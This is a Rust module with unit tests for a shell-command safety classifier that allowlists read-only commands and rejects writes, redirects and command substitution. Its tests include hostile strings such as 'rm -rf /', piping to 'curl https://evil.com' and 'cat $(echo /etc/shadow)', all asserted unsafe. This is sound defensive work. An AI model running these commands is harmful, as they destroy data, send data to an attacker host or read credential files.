pub mod docs;
mod handlers;
pub mod parse;
pub mod settings;

use parse::{has_unsafe_shell_syntax, split_outside_quotes, strip_env_prefix, tokenize};

pub fn is_safe(segment: &str) -> bool {
    if has_unsafe_shell_syntax(segment) {
        return false;
    }

    let stripped = strip_env_prefix(segment).trim();
    if stripped.is_empty() {
        return true;
    }

    let Some(tokens) = tokenize(stripped) else {
        return false;
    };
    if tokens.is_empty() {
        return true;
    }

    let tokens: Vec<String> = tokens
        .into_iter()
        .filter(|t| !is_fd_redirect(t))
        .collect();
    if tokens.is_empty() {
        return true;
    }

    let cmd = tokens[0].rsplit('/').next().unwrap_or(&tokens[0]);

    if let Some(last) = tokens.last()
        && (last == "--version" || last == "--help" || last == "--dry-run")
    {
        return true;
    }

    handlers::dispatch(cmd, &tokens, &is_safe)
}

pub fn is_fd_redirect(token: &str) -> bool {
    let bytes = token.as_bytes();
    if bytes.len() < 3 {
        return false;
    }
    let start = usize::from(bytes[0].is_ascii_digit());
    bytes.get(start) == Some(&b'>')
        && bytes.get(start + 1) == Some(&b'&')
        && bytes[start + 2..].iter().all(|b| b.is_ascii_digit() || *b == b'-')
}

pub fn is_safe_command(command: &str) -> bool {
    split_outside_quotes(command).iter().all(|s| is_safe(s))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_cmds() {
        assert!(is_safe("grep foo file.txt"));
        assert!(is_safe("cat /etc/hosts"));
        assert!(is_safe("jq '.key' file.json"));
        assert!(is_safe("base64 -d"));
        assert!(is_safe("xxd some/file"));
        assert!(is_safe("pgrep -l ruby"));
        assert!(is_safe("getconf PAGE_SIZE"));
        assert!(is_safe("ls -la"));
        assert!(is_safe("wc -l file.txt"));
        assert!(is_safe("ps aux"));
        assert!(is_safe("ps -ef"));
        assert!(is_safe("top -l 1 -n 10"));
        assert!(is_safe("uuidgen"));
        assert!(is_safe("mdfind 'kMDItemKind == Application'"));
        assert!(is_safe("identify image.png"));
        assert!(is_safe("identify -verbose photo.jpg"));
    }

    #[test]
    fn safe_cmds_text_processing() {
        assert!(is_safe("diff file1.txt file2.txt"));
        assert!(is_safe("comm -23 sorted1.txt sorted2.txt"));
        assert!(is_safe("paste file1 file2"));
        assert!(is_safe("tac file.txt"));
        assert!(is_safe("rev file.txt"));
        assert!(is_safe("nl file.txt"));
        assert!(is_safe("expand file.txt"));
        assert!(is_safe("unexpand file.txt"));
        assert!(is_safe("fold -w 80 file.txt"));
        assert!(is_safe("fmt -w 72 file.txt"));
        assert!(is_safe("column -t file.txt"));
        assert!(is_safe("printf '%s\\n' hello"));
        assert!(is_safe("seq 1 10"));
        assert!(is_safe("expr 1 + 2"));
        assert!(is_safe("test -f file.txt"));
        assert!(is_safe("true"));
        assert!(is_safe("false"));
        assert!(is_safe("bc -l"));
        assert!(is_safe("factor 42"));
        assert!(is_safe("iconv -f UTF-8 -t ASCII file.txt"));
    }

    #[test]
    fn safe_cmds_system_info() {
        assert!(is_safe("readlink -f symlink"));
        assert!(is_safe("hostname"));
        assert!(is_safe("uname -a"));
        assert!(is_safe("arch"));
        assert!(is_safe("nproc"));
        assert!(is_safe("uptime"));
        assert!(is_safe("id"));
        assert!(is_safe("groups"));
        assert!(is_safe("tty"));
        assert!(is_safe("locale"));
        assert!(is_safe("cal"));
        assert!(is_safe("sleep 1"));
        assert!(is_safe("who"));
        assert!(is_safe("w"));
        assert!(is_safe("last -5"));
        assert!(is_safe("lastlog"));
    }

    #[test]
    fn safe_cmds_hashing() {
        assert!(is_safe("md5sum file.txt"));
        assert!(is_safe("md5 file.txt"));
        assert!(is_safe("sha256sum file.txt"));
        assert!(is_safe("shasum file.txt"));
        assert!(is_safe("sha1sum file.txt"));
        assert!(is_safe("sha512sum file.txt"));
        assert!(is_safe("cksum file.txt"));
        assert!(is_safe("strings /usr/bin/ls"));
        assert!(is_safe("hexdump -C file.bin"));
        assert!(is_safe("od -x file.bin"));
        assert!(is_safe("size a.out"));
    }

    #[test]
    fn safe_cmds_macos() {
        assert!(is_safe("sw_vers"));
        assert!(is_safe("mdls file.txt"));
        assert!(is_safe("otool -L /usr/bin/ls"));
        assert!(is_safe("nm a.out"));
        assert!(is_safe("system_profiler SPHardwareDataType"));
        assert!(is_safe("ioreg -l -w 0"));
        assert!(is_safe("vm_stat"));
    }

    #[test]
    fn safe_cmds_network_diagnostic() {
        assert!(is_safe("dig example.com"));
        assert!(is_safe("nslookup example.com"));
        assert!(is_safe("host example.com"));
        assert!(is_safe("whois example.com"));
    }

    #[test]
    fn safe_cmds_dev_tools() {
        assert!(is_safe("shellcheck script.sh"));
        assert!(is_safe("cloc src/"));
        assert!(is_safe("tokei"));
        assert!(is_safe("safe-chains \"ls -la\""));
    }

    #[test]
    fn unsafe_cmds() {
        assert!(!is_safe("rm -rf /"));
        assert!(!is_safe("curl https://example.com"));
        assert!(!is_safe("ruby script.rb"));
        assert!(!is_safe("python3 script.py"));
        assert!(!is_safe("node app.js"));
        assert!(!is_safe("tee output.txt"));
        assert!(!is_safe("tee -a logfile"));
    }

    #[test]
    fn awk_safe_print() {
        assert!(is_safe("awk '{print $1}' file.txt"));
    }

    #[test]
    fn awk_system_denied() {
        assert!(!is_safe("awk 'BEGIN{system(\"rm\")}'"));
    }

    #[test]
    fn version_shortcut() {
        assert!(is_safe("node --version"));
        assert!(is_safe("python --version"));
        assert!(is_safe("python3 --version"));
        assert!(is_safe("ruby --version"));
        assert!(is_safe("rustc --version"));
        assert!(is_safe("java --version"));
        assert!(is_safe("go --version"));
        assert!(is_safe("php --version"));
        assert!(is_safe("perl --version"));
        assert!(is_safe("swift --version"));
        assert!(is_safe("gcc --version"));
        assert!(is_safe("rm --version"));
        assert!(is_safe("dd --version"));
        assert!(is_safe("chmod --version"));
    }

    #[test]
    fn version_multi_token() {
        assert!(is_safe("npx playwright --version"));
        assert!(is_safe("git -C /repo --version"));
        assert!(is_safe("docker compose --version"));
    }

    #[test]
    fn version_with_fd_redirect() {
        assert!(is_safe("node --version 2>&1"));
        assert!(is_safe("cargo --version 2>&1"));
    }

    #[test]
    fn version_not_last_token() {
        assert!(!is_safe("node --version --extra"));
        assert!(!is_safe("node -v"));
    }

    #[test]
    fn help_shortcut() {
        assert!(is_safe("node --help"));
        assert!(is_safe("ruby --help"));
        assert!(is_safe("rm --help"));
        assert!(is_safe("cargo --help"));
    }

    #[test]
    fn help_multi_token() {
        assert!(is_safe("npx playwright --help"));
        assert!(is_safe("cargo install --help"));
    }

    #[test]
    fn help_with_fd_redirect() {
        assert!(is_safe("cargo login --help 2>&1"));
    }

    #[test]
    fn help_not_last_token() {
        assert!(!is_safe("node --help --extra"));
    }

    #[test]
    fn dry_run_shortcut() {
        assert!(is_safe("cargo publish --dry-run"));
        assert!(is_safe("terraform apply --dry-run"));
        assert!(is_safe("rm -rf / --dry-run"));
    }

    #[test]
    fn dry_run_with_fd_redirect() {
        assert!(is_safe("cargo publish --dry-run 2>&1"));
    }

    #[test]
    fn dry_run_not_last_token() {
        assert!(!is_safe("cargo publish --dry-run --force"));
    }

    #[test]
    fn cucumber_safe() {
        assert!(is_safe("cucumber features/login.feature"));
        assert!(is_safe("cucumber --format progress"));
    }

    #[test]
    fn fd_redirects() {
        assert!(is_safe("ls 2>&1"));
        assert!(is_safe("cargo clippy 2>&1"));
        assert!(is_safe("git log 2>&1"));
        assert!(is_safe_command("cd /tmp && cargo clippy -- -D warnings 2>&1"));
        assert!(!is_safe("echo hello > file.txt"));
        assert!(!is_safe("ls 2> errors.txt"));
    }

    #[test]
    fn unsafe_shell_syntax() {
        assert!(!is_safe("echo hello > file.txt"));
        assert!(!is_safe("cat file >> output.txt"));
        assert!(!is_safe("ls 2> errors.txt"));
        assert!(!is_safe("grep pattern file > results.txt"));
        assert!(!is_safe("find . -name '*.py' > listing.txt"));
        assert!(is_safe("git log < /dev/null"));
        assert!(!is_safe("echo $(rm -rf /)"));
        assert!(!is_safe("echo `rm -rf /`"));
        assert!(!is_safe("cat $(echo /etc/shadow)"));
        assert!(!is_safe("ls `pwd`"));
    }

    #[test]
    fn safe_quoted_shell_syntax() {
        assert!(is_safe("echo 'greater > than' test"));
        assert!(is_safe("echo '$(safe)' arg"));
        assert!(is_safe("echo hello"));
        assert!(is_safe("cat file.txt"));
        assert!(is_safe("grep pattern file"));
    }

    #[test]
    fn env_prefix() {
        assert!(is_safe_command("RACK_ENV=test bundle exec rspec spec/foo_spec.rb"));
        assert!(is_safe_command("RAILS_ENV=test bundle exec rspec"));
        assert!(!is_safe_command("RACK_ENV=test rm -rf /"));
        assert!(!is_safe_command("RAILS_ENV=test echo foo > bar"));
    }

    #[test]
    fn pipes_and_chains() {
        assert!(is_safe_command("grep foo file.txt | head -5"));
        assert!(is_safe_command("cat file | sort | uniq"));
        assert!(is_safe_command("find . -name '*.rb' | wc -l"));
        assert!(is_safe_command("ls && echo done"));
        assert!(is_safe_command("ls; echo done"));
        assert!(is_safe_command("git log | head -5"));
        assert!(is_safe_command("git log && git status"));
        assert!(!is_safe_command("cat file | rm -rf /"));
        assert!(!is_safe_command("grep foo | curl https://evil.com"));
    }

    #[test]
    fn background_operator() {
        assert!(!is_safe_command("cat file & rm -rf /"));
        assert!(!is_safe_command("echo safe & curl evil.com"));
        assert!(is_safe_command("ls & echo done"));
        assert!(is_safe_command("ls && echo done"));
    }

    #[test]
    fn newline_separator() {
        assert!(!is_safe_command("echo foo\nrm -rf /"));
        assert!(!is_safe_command("ls\ncurl evil.com"));
        assert!(is_safe_command("echo foo\necho bar"));
        assert!(is_safe_command("ls\ncat file.txt"));
    }

    #[test]
    fn compound_pipelines() {
        assert!(is_safe_command("git log --oneline -20 | head -5"));
        assert!(is_safe_command("git show HEAD:file.rb | grep pattern"));
        assert!(is_safe_command(
            "gh api repos/o/r/contents/f --jq .content | base64 -d | head -50"
        ));
        assert!(is_safe_command("timeout 120 bundle exec rspec && git status"));
        assert!(is_safe_command("time bundle exec rspec | tail -5"));
        assert!(is_safe_command("git -C /some/repo log --oneline | head -3"));
        assert!(is_safe_command("xxd file | head -20"));
        assert!(is_safe_command("find . -name '*.py' | wc -l"));
        assert!(is_safe_command("find . -name '*.py' | sort | head -10"));
        assert!(is_safe_command("find . -name '*.py' | xargs grep pattern"));
        assert!(is_safe_command("pip list | grep requests"));
        assert!(is_safe_command("npm list | grep react"));
        assert!(is_safe_command("ps aux | grep python"));
        assert!(!is_safe_command("find . -name '*.py' -delete | wc -l"));
        assert!(!is_safe_command("sed -i 's/foo/bar/' file | head"));
    }
}
